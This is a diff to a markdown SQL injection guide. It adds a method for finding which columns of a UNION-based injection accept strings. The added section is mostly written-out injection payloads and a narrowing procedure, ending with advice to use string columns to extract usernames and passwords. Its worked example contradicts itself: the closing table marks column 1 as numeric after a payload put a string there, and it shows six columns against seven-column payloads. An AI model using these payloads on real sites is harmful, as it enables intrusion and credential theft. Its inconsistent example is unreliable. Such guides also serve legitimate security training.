@@ -34,7 +34,9 @@ When no error occurs and extra row appears = correct column count.
 
 ## Finding String Columns
 
-Test each column for string compatibility:
+### Method 1: Individual Testing (Basic)
+
+Test each column individually:
 
 ```sql
 ' UNION SELECT 'a',NULL,NULL--
@@ -43,6 +45,55 @@ Test each column for string compatibility:
 ```
 
 No error = column accepts strings.
+
+### Method 2: All-String Test (Recommended)
+
+**More practical approach for real-world scenarios:**
+
+#### Step 1: Test all positions with strings
+
+```sql
+' UNION SELECT 'a','a','a','a','a','a','a'--
+```
+
+**If error occurs** (e.g., "TypeError: must be real number, not str"):
+→ At least one column requires numeric data
+
+#### Step 2: Binary search for numeric columns
+
+Replace columns one-by-one or in groups with numbers:
+
+```sql
+# Test first half
+' UNION SELECT 1,2,3,'a','a','a','a'--
+
+# Narrow down
+' UNION SELECT 'a','a','a',4,'a','a','a'--
+
+# Test multiple numeric columns
+' UNION SELECT 'a','a','a',4,'a',6,7--
+```
+
+#### Step 3: Identify final column types
+
+```sql
+# Success! Means:
+# Columns 2,3,5 = STRING (accept any data)
+# Columns 4,6,7 = NUMERIC (only accept numbers)
+```
+
+**Example Result:**
+
+| Column | Type | Accept String? | Use for Data Extraction? |
+|--------|------|----------------|--------------------------|
+| 1 | INT | ❌ | Maybe (if visible) |
+| 2 | VARCHAR | ✅ | ✅ BEST |
+| 3 | TEXT | ✅ | ✅ GOOD |
+| 4 | DECIMAL | ❌ | ❌ Numeric only |
+| 5 | VARCHAR | ✅ | ✅ GOOD |
+| 6 | INT | ❌ | ❌ Numeric only |
+
+✅ **Always use STRING columns for extracting database names, table names, usernames, passwords, etc.**
 
 ## Basic UNION Payloads
 
